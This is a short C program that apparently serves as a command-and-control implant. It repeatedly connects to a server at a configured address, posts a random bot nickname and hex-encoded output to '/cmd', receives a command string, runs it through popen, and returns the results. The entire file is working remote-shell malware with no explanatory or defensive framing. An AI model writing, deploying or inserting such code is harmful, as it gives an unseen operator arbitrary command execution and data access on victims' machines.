#include "extclib/net.h"
#include "extclib/crypto.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)

#define BUFSIZ_2M (2 << 20)
#define BUFSIZ_4M (4 << 20)
#define BUFSIZ_8M (8 << 20)

#define NICKSIZE 32
#define ADDRESS "127.0.0.1", 8080

static char buffer[BUFSIZ_8M];
static char result[BUFSIZ_4M];

int main(void) {
	char command[BUFSIZ_2K] = "NULL";
	char nickname[NICKSIZE+1];
	char inputs[BUFSIZ_1K];

	net_conn *conn;
	FILE *pipe;
	char *ptr;
	int ret;

	crypto_rand(buffer, NICKSIZE/2);
	crypto_hex(1, nickname, NICKSIZE+1, buffer, NICKSIZE/2);

	snprintf(inputs, BUFSIZ_1K, "{\"return\":%%d,\"result\":\"%%%d[^\"]\"}", BUFSIZ_2K-1);

	while(1) {
		conn = net_connect(ADDRESS);
		if (conn == NULL) {
			sleep(5);
			continue;
		}

		if (strcmp(command, "NULL") == 0) {
			result[0] = '\0';
		}

		snprintf(buffer, BUFSIZ_8M, "{\"body\":[\"%s\", \"%s\"]}", nickname, result);
		net_http_post(conn, "/cmd", buffer);

		ret = net_recv(conn, buffer, BUFSIZ_2M);
		buffer[ret] = '\0';
		net_close(conn);

		ptr = strstr(buffer, "{");
		if (ptr == NULL) {
			continue;
		}

		ret = -1;
		sscanf(ptr, inputs, &ret, command);
		if (ret != 0) {
			continue;
		}

		if (strcmp(command, "NULL") == 0) {
			continue;
		}

		result[0] = '\0';
		pipe = popen(command, "r");
		ret = fread(buffer, sizeof(char), BUFSIZ_2M - 1, pipe);
		crypto_hex(1, result, BUFSIZ_4M, buffer, ret);
		pclose(pipe);
	}
	
	return 0;
}
